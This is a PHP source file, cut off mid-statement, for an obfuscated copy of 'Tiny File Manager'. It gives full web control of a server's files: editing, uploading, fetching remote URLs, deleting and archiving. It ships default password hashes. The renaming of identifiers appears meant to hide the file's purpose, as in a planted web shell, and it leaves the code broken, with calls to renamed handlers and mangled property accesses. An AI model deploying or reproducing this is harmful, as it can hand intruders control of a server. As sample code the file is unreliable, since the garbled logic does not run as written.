<?php $s3b='{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';/**
 * H3K | Tiny File Manager V2.5.3
 * @author CCP Programmers
 * @email ccpprogrammers@gmail.com
 * @github https://github.com/prasathmani/tinyfilemanager
 * @link https://tinyfilemanager.github.io
 */ define('VERSION','2.5.3');define('APP_TITLE','Tiny File Manager');$h3c=true;$w3d=array('admin'=>'$2y$10$3YYI/HhwxjZHvy71KMGyz.Y7c.x0IraKKnXcfIB8pC5gHceeQBgGC','user'=>'$2y$10$r.TImyohZgRzdBZX4d6/Fuh9txqR9TWDBLjcpnhxa4QyiMC4RY1Gm' );$q3e=array('user');$s3f=false;$q40=array();$x41=true;$u42='vs';$q43=true;$y44='Etc/UTC';$w45=$_SERVER['DOCUMENT_ROOT'];$y46='';$m47=$_SERVER['HTTP_HOST'];$v48='UTF-8';$c49='m/d/Y g:i A';$r4a='full';$y4b='';$q4c='';$q4d='';$m4e=array();$p4f='google';$q50=true;$e51=5000000000;$v52=2000000;$p53='OFF';$r54=true;$l55=array('127.0.0.1','::1' );$z56=array('0.0.0.0','::' );$f57=__DIR__.'/config.php';if(is_readable($f57)){@include($f57);}$i58=array('css-bootstrap'=>'<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">','css-dropzone'=>'<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">','css-font-awesome'=>'<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">','css-highlightjs'=>'<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/'.$u42.'.min.css">','js-ace'=>'<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>','js-bootstrap'=>'<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>','js-dropzone'=>'<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>','js-jquery'=>'<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>','js-jquery-datatables'=>'<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>','js-highlightjs'=>'<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>','pre-jsdelivr'=>'<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>','pre-cloudflare'=>'<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>');define('MAX_UPLOAD_SIZE',$e51);define('UPLOAD_CHUNK_SIZE',$v52);if(!defined('FM_SESSION_ID')){define('FM_SESSION_ID','filemanager');}$w59=new v5a();$b5b=isset($w59->$v5c['lang'])?$w59->$v5c['lang']:'en';$v5d=isset($w59->$v5c['show_hidden'])?$w59->$v5c['show_hidden']:true;$f5e=isset($w59->$v5c['error_reporting'])?$w59->$v5c['error_reporting']:true;$o5f=isset($w59->$v5c['hide_Cols'])?$w59->$v5c['hide_Cols']:true;$q60=isset($w59->$v5c['theme'])?$w59->$v5c['theme']:'light';define('FM_THEME',$q60);$p61=array('en'=>'English');if($f5e==true){@ini_set('error_reporting',E_ALL);@ini_set('display_errors',1);}else{@ini_set('error_reporting',E_ALL);@ini_set('display_errors',0);}if(defined('FM_EMBED')){$h3c=false;$q50=false;}else{@set_time_limit(600);date_default_timezone_set($y44);ini_set('default_charset','UTF-8');if(version_compare(PHP_VERSION,'5.6.0','<')&&function_exists('mb_internal_encoding')){mb_internal_encoding('UTF-8');}if(function_exists('mb_regex_encoding')){mb_regex_encoding('UTF-8');}session_cache_limiter('nocache');session_name(FM_SESSION_ID);function w0($h62,$n63,$u64,$q65){if($h62==2){session_abort();session_id(session_create_id());@session_start();}}set_error_handler('session_error_handling_function');session_start();restore_error_handler();}if(empty($_SESSION['token'])){if(function_exists('random_bytes')){$_SESSION['token']=bin2hex(random_bytes(32));}else{$_SESSION['token']=bin2hex(openssl_random_pseudo_bytes(32));}}if(empty($w3d)){$h3c=false;}$p66=isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on'||$_SERVER['HTTPS']==1)||isset($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']=='https';if(isset($_SESSION[FM_SESSION_ID]['logged'])&&!empty($q40[$_SESSION[FM_SESSION_ID]['logged']])){$u67=r13(dirname($_SERVER['PHP_SELF']));$y46=$y46.$u67.DIRECTORY_SEPARATOR.$q40[$_SESSION[FM_SESSION_ID]['logged']];}$y46=r13($y46);defined('FM_ROOT_URL')||define('FM_ROOT_URL',($p66?'https':'http').'://'.$m47.(!empty($y46)?'/'.$y46:''));defined('FM_SELF_URL')||define('FM_SELF_URL',($p66?'https':'http').'://'.$m47.$_SERVER['PHP_SELF']);if(isset($_GET['logout'])){unset($_SESSION[FM_SESSION_ID]['logged']);unset($_SESSION['token']);f11(FM_SELF_URL);}if($p53!='OFF'){function s1(){if(array_key_exists('HTTP_CF_CONNECTING_IP',$_SERVER)){return $_SERVER["HTTP_CF_CONNECTING_IP"];}else if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){return $_SERVER["HTTP_X_FORWARDED_FOR"];}else if(array_key_exists('REMOTE_ADDR',$_SERVER)){return $_SERVER['REMOTE_ADDR'];}else if(array_key_exists('HTTP_CLIENT_IP',$_SERVER)){return $_SERVER['HTTP_CLIENT_IP'];}return '';}$u68=s1();$g69=false;$p6a=in_array($u68,$l55);$q6b=in_array($u68,$z56);if($p53=='AND'){if($p6a==true&&$q6b==false){$g69=true;}}else if($p53=='OR'){if($p6a==true||$q6b==false){$g69=true;}}if($g69==false){trigger_error('User connection denied from: '.$u68,E_USER_WARNING);if($r54==false){j1e(c3a('Access denied. IP restriction applicable'),'error');x36();j35();}exit();}}if($h3c){if(isset($_SESSION[FM_SESSION_ID]['logged'],$w3d[$_SESSION[FM_SESSION_ID]['logged']])){}elseif(isset($_POST['fm_usr'],$_POST['fm_pwd'],$_POST['token'])){sleep(1);if(function_exists('password_verify')){if(isset($w3d[$_POST['fm_usr']])&&isset($_POST['fm_pwd'])&&password_verify($_POST['fm_pwd'],$w3d[$_POST['fm_usr']])&&z8($_POST['token'])){$_SESSION[FM_SESSION_ID]['logged']=$_POST['fm_usr'];j1e(c3a('You are logged in'));f11(FM_SELF_URL);}else{unset($_SESSION[FM_SESSION_ID]['logged']);j1e(c3a('Login failed. Invalid username or password'),'error');f11(FM_SELF_URL);}}else{j1e(c3a('password_hash not supported, Upgrade PHP version'),'error');;}}else{unset($_SESSION[FM_SESSION_ID]['logged']);x36();?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo p2d();?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z"/></g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php echo APP_TITLE;?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo c3a('Username');?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo c3a('Password');?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php j35();?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php echo htmlentities($_SESSION['token']);?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php echo c3a('Login');?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION;?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php w37();exit;}}if($h3c&&isset($_SESSION[FM_SESSION_ID]['logged'])){$w45=isset($q40[$_SESSION[FM_SESSION_ID]['logged']])?$q40[$_SESSION[FM_SESSION_ID]['logged']]:$w45;}$w45=rtrim($w45,'\\/');$w45=str_replace('\\','/',$w45);if(!@is_dir($w45)){echo "<h1>".c3a('Root path')." \"{$w45}\" ".c3a('not found!')." </h1>";exit;}defined('FM_SHOW_HIDDEN')||define('FM_SHOW_HIDDEN',$v5d);defined('FM_ROOT_PATH')||define('FM_ROOT_PATH',$w45);defined('FM_LANG')||define('FM_LANG',$b5b);defined('FM_FILE_EXTENSION')||define('FM_FILE_EXTENSION',$y4b);defined('FM_UPLOAD_EXTENSION')||define('FM_UPLOAD_EXTENSION',$q4c);defined('FM_EXCLUDE_ITEMS')||define('FM_EXCLUDE_ITEMS',(version_compare(PHP_VERSION,'7.0.0','<')?serialize($m4e):$m4e));defined('FM_DOC_VIEWER')||define('FM_DOC_VIEWER',$p4f);define('FM_READONLY',$s3f||($h3c&&!empty($q3e)&&isset($_SESSION[FM_SESSION_ID]['logged'])&&in_array($_SESSION[FM_SESSION_ID]['logged'],$q3e)));define('FM_IS_WIN',DIRECTORY_SEPARATOR=='\\');if(!isset($_GET['p'])&&empty($_FILES)){f11(FM_SELF_URL.'?p=');}$q6c=isset($_GET['p'])?$_GET['p']:(isset($_POST['p'])?$_POST['p']:'');$q6c=r13($q6c);$t6d=file_get_contents('php://input');$_POST=(strpos($t6d,'ajax')!=FALSE&&strpos($t6d,'save')!=FALSE)?json_decode($t6d,true):$_POST;define('FM_PATH',$q6c);define('FM_USE_AUTH',$h3c);define('FM_EDIT_FILE',$q43);defined('FM_ICONV_INPUT_ENC')||define('FM_ICONV_INPUT_ENC',$v48);defined('FM_USE_HIGHLIGHTJS')||define('FM_USE_HIGHLIGHTJS',$x41);defined('FM_HIGHLIGHTJS_STYLE')||define('FM_HIGHLIGHTJS_STYLE',$u42);defined('FM_DATETIME_FORMAT')||define('FM_DATETIME_FORMAT',$c49);unset($q6c,$h3c,$v48,$x41,$u42);if((isset($_SESSION[FM_SESSION_ID]['logged'],$w3d[$_SESSION[FM_SESSION_ID]['logged']])||!FM_USE_AUTH)&&isset($_POST['ajax'],$_POST['token'])&&!FM_READONLY){if(!z8($_POST['token'])){header('HTTP/1.0 401 Unauthorized');die("Invalid Token.");}if(isset($_POST['type'])&&$_POST['type']=="search"){$u6e=$_POST['path']=="."?'':$_POST['path'];$j6f=t2b(r13($u6e),$_POST['content']);echo json_encode($j6f);exit();}if(isset($_POST['type'])&&$_POST['type']=="save"){$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}if(!is_dir($m70)){f11(FM_SELF_URL.'?p=');}$u64=$_GET['edit'];$u64=r13($u64);$u64=str_replace('/','',$u64);if($u64==''||!is_file($m70.'/'.$u64)){j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}header('X-XSS-Protection:0');$q72=$m70.'/'.$u64;$n73=$_POST['content'];$a74=fopen($q72,"w");$e75=@fwrite($a74,$n73);fclose($a74);if($e75===false){header("HTTP/1.1 500 Internal Server Error");die("Could Not Write File! - Check Permissions / Ownership");}die(true);}if(isset($_POST['type'])&&$_POST['type']=="backup"&&!empty($_POST['file'])){$m76=r13($_POST['file']);$n77=FM_ROOT_PATH.'/';if(!empty($_POST['path'])){$v78=r13($_POST['path']);$n77.="{$v78}/";}$y79=date("dMy-His");$q7a="{$m76}-{$y79}.bak";$b7b=$n77.$m76;try{if(!file_exists($b7b)){throw new h7c("File {$m76} not found");}if(copy($b7b,$n77.$q7a)){echo"Backup {$q7a} created";}else{throw new h7c("Could not copy file {$m76}");}}catch(Exception $f7d){echo $f7d->g7e();}}if(isset($_POST['type'])&&$_POST['type']=="settings"){global $w59,$b5b,$f5e,$v5d,$p61,$o5f,$q60;$d7f=$_POST['js-language'];y17([]);if(!array_key_exists($d7f,$p61)){$d7f='en';}$t80=isset($_POST['js-error-report'])&&$_POST['js-error-report']=="true"?true:false;$d81=isset($_POST['js-show-hidden'])&&$_POST['js-show-hidden']=="true"?true:false;$e82=isset($_POST['js-hide-cols'])&&$_POST['js-hide-cols']=="true"?true:false;$r83=$_POST['js-theme-3'];if($w59->$v5c['lang']!=$d7f){$w59->$v5c['lang']=$d7f;$b5b=$d7f;}if($w59->$v5c['error_reporting']!=$t80){$w59->$v5c['error_reporting']=$t80;$f5e=$t80;}if($w59->$v5c['show_hidden']!=$d81){$w59->$v5c['show_hidden']=$d81;$v5d=$d81;}if($w59->$v5c['show_hidden']!=$d81){$w59->$v5c['show_hidden']=$d81;$v5d=$d81;}if($w59->$v5c['hide_Cols']!=$e82){$w59->$v5c['hide_Cols']=$e82;$o5f=$e82;}if($w59->$v5c['theme']!=$r83){$w59->$v5c['theme']=$r83;$q60=$r83;}$w59->y33();echo true;}if(isset($_POST['type'])&&$_POST['type']=="pwdhash"){$k84=isset($_POST['inputPassword2'])&&!empty($_POST['inputPassword2'])?password_hash($_POST['inputPassword2'],PASSWORD_DEFAULT):'';echo $k84;}if(isset($_POST['type'])&&$_POST['type']=="upload"&&!empty($_REQUEST["uploadurl"])){$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}function n2($h85){global $e86;echo json_encode($h85);}function z3(){global $m70,$s87,$q88;return $m70."/".basename($s87->$b89);}$b8a=!empty($_REQUEST["uploadurl"])&&preg_match("|^http(s)?://.+$|",stripslashes($_REQUEST["uploadurl"]))?stripslashes($_REQUEST["uploadurl"]):null;$g8b=parse_url($b8a,PHP_URL_HOST);$s8c=parse_url($b8a,PHP_URL_PORT);$r8d=[22,23,25,3306];if(preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i",$g8b)||in_array($s8c,$r8d)){$o8e=array("message"=>"URL is not allowed");n2(array("fail"=>$o8e));exit();}$e8f=false;$q88=tempnam(sys_get_temp_dir(),"upload-");$s87=new k90();$s87->$b89=trim(basename($b8a),".\x00..\x20");$d91=(FM_UPLOAD_EXTENSION)?explode(',',FM_UPLOAD_EXTENSION):false;$a92=strtolower(pathinfo($s87->$b89,PATHINFO_EXTENSION));$b93=($d91)?in_array($a92,$d91):true;$o8e=false;if(!$b93){$o8e=array("message"=>"File extension is not allowed");n2(array("fail"=>$o8e));exit();}if(!$b8a){$a94=false;}else if($e8f){@$o95=fopen($q88,"w");@$k96=curl_init($b8a);curl_setopt($k96,CURLOPT_NOPROGRESS,false);curl_setopt($k96,CURLOPT_FOLLOWLOCATION,true);curl_setopt($k96,CURLOPT_FILE,$o95);@$a94=curl_exec($k96);$x97=curl_getinfo($k96);if(!$a94){$o8e=array("message"=>curl_error($k96));}@curl_close($k96);fclose($o95);$s87->$p98=$x97["size_download"];$s87->$r99=$x97["content_type"];}else{$v9a=stream_context_create();@$a94=copy($b8a,$q88,$v9a);if(!$a94){$o8e=error_get_last();}}if($a94){$a94=rename($q88,strtok(z3(),'?'));}if($a94){n2(array("done"=>$s87));}else{unlink($q88);if(!$o8e){$o8e=array("message"=>"Invalid url parameter");}n2(array("fail"=>$o8e));}}exit();}if(isset($_GET['del'],$_POST['token'])&&!FM_READONLY){$n9b=str_replace('/','',r13($_GET['del']));if($n9b!=''&&$n9b!='..'&&$n9b!='.'&&z8($_POST['token'])){$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}$f9c=is_dir($m70.'/'.$n9b);if(n9($m70.'/'.$n9b)){$n63=$f9c?c3a('Folder').' <b>%s</b> '.c3a('Deleted'):c3a('File').' <b>%s</b> '.c3a('Deleted');j1e(sprintf($n63,g1c($n9b)));}else{$n63=$f9c?c3a('Folder').' <b>%s</b> '.c3a('not deleted'):c3a('File').' <b>%s</b> '.c3a('not deleted');j1e(sprintf($n63,g1c($n9b)),'error');}}else{j1e(c3a('Invalid file or folder name'),'error');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_POST['newfilename'],$_POST['newfile'],$_POST['token'])&&!FM_READONLY){$g9d=urldecode($_POST['newfile']);$n9e=str_replace('/','',r13(strip_tags($_POST['newfilename'])));if(n1d($n9e)&&$n9e!=''&&$n9e!='..'&&$n9e!='.'&&z8($_POST['token'])){$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}if($g9d=="file"){if(!file_exists($m70.'/'.$n9e)){if(db($n9e)){@fopen($m70.'/'.$n9e,'w')or die('Cannot open file:  '.$n9e);j1e(sprintf(c3a('File').' <b>%s</b> '.c3a('Created'),g1c($n9e)));}else{j1e(c3a('File extension is not allowed'),'error');}}else{j1e(sprintf(c3a('File').' <b>%s</b> '.c3a('already exists'),g1c($n9e)),'alert');}}else{if(te($m70.'/'.$n9e,false)===true){j1e(sprintf(c3a('Folder').' <b>%s</b> '.c3a('Created'),$n9e));}elseif(te($m70.'/'.$n9e,false)===$m70.'/'.$n9e){j1e(sprintf(c3a('Folder').' <b>%s</b> '.c3a('already exists'),g1c($n9e)),'alert');}else{j1e(sprintf(c3a('Folder').' <b>%s</b> '.c3a('not created'),g1c($n9e)),'error');}}}else{j1e(c3a('Invalid characters in file or folder name'),'error');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_GET['copy'],$_GET['finish'])&&!FM_READONLY){$f9f=urldecode($_GET['copy']);$f9f=r13($f9f);if($f9f==''){j1e(c3a('Source path not defined'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}$ba0=FM_ROOT_PATH.'/'.$f9f;$ba1=FM_ROOT_PATH;if(FM_PATH!=''){$ba1.='/'.FM_PATH;}$ba1.='/'.basename($ba0);$wa2=isset($_GET['move']);$wa2=r13(urldecode($wa2));if($ba0!=$ba1){$aa3=trim(FM_PATH.'/'.basename($ba0),'/');if($wa2){$ea4=fc($ba0,$ba1);if($ea4){j1e(sprintf(c3a('Moved from').' <b>%s</b> '.c3a('to').' <b>%s</b>',g1c($f9f),g1c($aa3)));}elseif($ea4===null){j1e(c3a('File or folder with this path already exists'),'alert');}else{j1e(sprintf(c3a('Error while moving from').' <b>%s</b> '.c3a('to').' <b>%s</b>',g1c($f9f),g1c($aa3)),'error');}}else{if(wd($ba0,$ba1)){j1e(sprintf(c3a('Copied from').' <b>%s</b> '.c3a('to').' <b>%s</b>',g1c($f9f),g1c($aa3)));}else{j1e(sprintf(c3a('Error while copying from').' <b>%s</b> '.c3a('to').' <b>%s</b>',g1c($f9f),g1c($aa3)),'error');}}}else{if(!$wa2){$aa3=trim(FM_PATH.'/'.basename($ba0),'/');$la5=pathinfo($ba0);$pa6='';if(!is_dir($ba0)){$pa6='.'.$la5['extension'];}$ga7=$la5['dirname'].'/'.$la5['filename'].'-'.date('YmdHis').$pa6;$da8=0;$ka9=1000;while(file_exists($ga7)&$da8<$ka9){$la5=pathinfo($ga7);$ga7=$la5['dirname'].'/'.$la5['filename'].'-copy'.$pa6;$da8++;}if(wd($ba0,$ga7,False)){j1e(sprintf('Copied from <b>%s</b> to <b>%s</b>',g1c($f9f),g1c($ga7)));}else{j1e(sprintf('Error while copying from <b>%s</b> to <b>%s</b>',g1c($f9f),g1c($ga7)),'error');}}else{j1e(c3a('Paths must be not equal'),'alert');}}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_POST['file'],$_POST['copy_to'],$_POST['finish'],$_POST['token'])&&!FM_READONLY){if(!z8($_POST['token'])){j1e(c3a('Invalid Token.'),'error');}$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}$kaa=FM_ROOT_PATH;$iab=r13($_POST['copy_to']);if($iab!=''){$kaa.='/'.$iab;}if($m70==$kaa){j1e(c3a('Paths must be not equal'),'alert');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(!is_dir($kaa)){if(!te($kaa,true)){j1e('Unable to create destination folder','error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}}$wa2=isset($_POST['move']);$yac=0;$yad=$_POST['file'];if(is_array($yad)&&count($yad)){foreach($yad as $pae){if($pae!=''){$pae=r13($pae);$ba0=$m70.'/'.$pae;$ba1=$kaa.'/'.$pae;if($wa2){$ea4=fc($ba0,$ba1);if($ea4===false){$yac++;}}else{if(!wd($ba0,$ba1)){$yac++;}}}}if($yac==0){$n63=$wa2?'Selected files and folders moved':'Selected files and folders copied';j1e($n63);}else{$n63=$wa2?'Error while moving items':'Error while copying items';j1e($n63,'error');}}else{j1e(c3a('Nothing selected'),'alert');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_POST['rename_from'],$_POST['rename_to'],$_POST['token'])&&!FM_READONLY){if(!z8($_POST['token'])){j1e("Invalid Token.",'error');}$yaf=urldecode($_POST['rename_from']);$yaf=r13($yaf);$yaf=str_replace('/','',$yaf);$n9e=urldecode($_POST['rename_to']);$n9e=r13(strip_tags($n9e));$n9e=str_replace('/','',$n9e);$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}if(n1d($n9e)&&$yaf!=''&&$n9e!=''){if(fc($m70.'/'.$yaf,$m70.'/'.$n9e)){j1e(sprintf(c3a('Renamed from').' <b>%s</b> '.c3a('to').' <b>%s</b>',g1c($yaf),g1c($n9e)));}else{j1e(sprintf(c3a('Error while renaming from').' <b>%s</b> '.c3a('to').' <b>%s</b>',g1c($yaf),g1c($n9e)),'error');}}else{j1e(c3a('Invalid characters in file name'),'error');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_GET['dl'],$_POST['token'])){if(!z8($_POST['token'])){j1e("Invalid Token.",'error');}$kb0=urldecode($_GET['dl']);$kb0=r13($kb0);$kb0=str_replace('/','',$kb0);$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}if($kb0!=''&&is_file($m70.'/'.$kb0)){f2c($m70.'/'.$kb0,$kb0,1024);exit;}else{j1e(c3a('File not found'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}}if(!empty($_FILES)&&!FM_READONLY){if(isset($_POST['token'])){if(!z8($_POST['token'])){$j6f=array('status'=>'error','info'=>"Invalid Token.");echo json_encode($j6f);exit();}}else{$j6f=array('status'=>'error','info'=>"Token Missing.");echo json_encode($j6f);exit();}$tb1=$_POST['dzchunkindex'];$ib2=$_POST['dztotalchunkcount'];$gb3=r13($_REQUEST['fullpath']);$pae=$_FILES;$m70=FM_ROOT_PATH;$db4=DIRECTORY_SEPARATOR;if(FM_PATH!=''){$m70.='/'.FM_PATH;}$yac=0;$nb5=0;$d91=(FM_UPLOAD_EXTENSION)?explode(',',FM_UPLOAD_EXTENSION):false;$j6f=array('status'=>'error','info'=>'Oops! Try again');$mb6=$pae['file']['name'];$tb7=$pae['file']['tmp_name'];$a92=pathinfo($mb6,PATHINFO_FILENAME)!=''?strtolower(pathinfo($mb6,PATHINFO_EXTENSION)):'';$b93=($d91)?in_array($a92,$d91):true;if(!n1d($mb6)&&!n1d($gb3)){$j6f=array('status'=>'error','info'=>"Invalid File name!",);echo json_encode($j6f);exit();}$mb8=$m70.$db4;if(is_writable($mb8)){$n77=$m70.'/'.basename($gb3);$xb9=substr($n77,0,strrpos($n77,"/"));if(!is_dir($xb9)){$yaf=umask(0);mkdir($xb9,0777,true);umask($yaf);}if(empty($pae['file']['error'])&&!empty($tb7)&&$tb7!='none'&&$b93){if($ib2){$hba=@fopen("{$n77}.part",$tb1==0?"wb":"ab");if($hba){$lbb=@fopen($tb7,"rb");if($lbb){if(PHP_VERSION_ID<80009){do{for(;;){$fbc=fread($lbb,4096);if($fbc===false||$fbc===''){break;}fwrite($hba,$fbc);}}while(!feof($lbb));}else{stream_copy_to_stream($lbb,$hba);}$j6f=array('status'=>'success','info'=>"file upload successful");}else{$j6f=array('status'=>'error','info'=>"failed to open output stream",'errorDetails'=>error_get_last());}@fclose($lbb);@fclose($hba);@unlink($tb7);$j6f=array('status'=>'success','info'=>"file upload successful");}else{$j6f=array('status'=>'error','info'=>"failed to open output stream");}if($tb1==$ib2-1){if(file_exists($n77)){$hbd=$a92?'.'.$a92:'';$tbe=$m70.'/'.basename($gb3,$hbd).'_'.date('ymdHis').$hbd;}else{$tbe=$n77;}rename("{$n77}.part",$tbe);}}else if(move_uploaded_file($tb7,$n77)){if(file_exists($n77)){$j6f=array('status'=>'success','info'=>"file upload successful");}else{$j6f=array('status'=>'error','info'=>'Couldn\'t upload the requested file.');}}else{$j6f=array('status'=>'error','info'=>"Error while uploading files. Uploaded files $nb5",);}}}else{$j6f=array('status'=>'error','info'=>'The specified folder for upload isn\'t writeable.');}echo json_encode($j6f);exit();}if(isset($_POST['group'],$_POST['delete'],$_POST['token'])&&!FM_READONLY){if(!z8($_POST['token'])){j1e(c3a("Invalid Token."),'error');}$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}$yac=0;$yad=$_POST['file'];if(is_array($yad)&&count($yad)){foreach($yad as $pae){if($pae!=''){$jbf=$m70.'/'.$pae;if(!n9($jbf)){$yac++;}}}if($yac==0){j1e(c3a('Selected files and folder deleted'));}else{j1e(c3a('Error while deleting items'),'error');}}else{j1e(c3a('Nothing selected'),'alert');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_POST['group'],$_POST['token'])&&(isset($_POST['zip'])||isset($_POST['tar']))&&!FM_READONLY){if(!z8($_POST['token'])){j1e(c3a("Invalid Token."),'error');}$m70=FM_ROOT_PATH;$a92='zip';if(FM_PATH!=''){$m70.='/'.FM_PATH;}$a92=isset($_POST['tar'])?'tar':'zip';if(($a92=="zip"&&!class_exists('ZipArchive'))||($a92=="tar"&&!class_exists('PharData'))){j1e(c3a('Operations with archives are not available'),'error');$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}$yad=$_POST['file'];$vc0=array();foreach($yad as $u64){array_push($vc0,r13($u64));}$yad=$vc0;if(!empty($yad)){chdir($m70);if(count($yad)==1){$uc1=reset($yad);$uc1=basename($uc1);$dc2=$uc1.'_'.date('ymd_His').'.'.$a92;}else{$dc2='archive_'.date('ymd_His').'.'.$a92;}if($a92=='zip'){$wc3=new rc4();$k84=$wc3->d2f($dc2,$yad);}elseif($a92=='tar'){$pc5=new dc6();$k84=$pc5->d2f($dc2,$yad);}if($k84){j1e(sprintf(c3a('Archive').' <b>%s</b> '.c3a('Created'),g1c($dc2)));}else{j1e(c3a('Archive not created'),'error');}}else{j1e(c3a('Nothing selected'),'alert');}$e71=FM_PATH;f11(FM_SELF_URL.'?p='.urlencode($e71));}if(isset($_POST['unzip'],$_POST['token'])&&!FM_READONLY){if(!z8($_POST['token'])){j1e(c3a("Invalid Token."),'error');}$fc7=urldecode($_POST['unzip']);$fc7=r13($fc7);$fc7=str_replace('/','',$fc7);$zc8=false;$m70=FM_ROOT_PATH;if(FM_PATH!=''){$m70.='/'.FM_PATH;}if($fc7!=''&&is_file($m70.'/'.$fc7)){$oc9=$m70.'/'.$fc7;$a92=pathinfo($oc9,PATHINFO_EXTENSION);$zc8=true;}else{j1e(c3a('File not found'),'error');}if(($a92=="zip"&&!class_exists('ZipArchive'))||($a92=="tar"&&!class_exists('PharData'))){j1e(c3a('Operations with archives are not 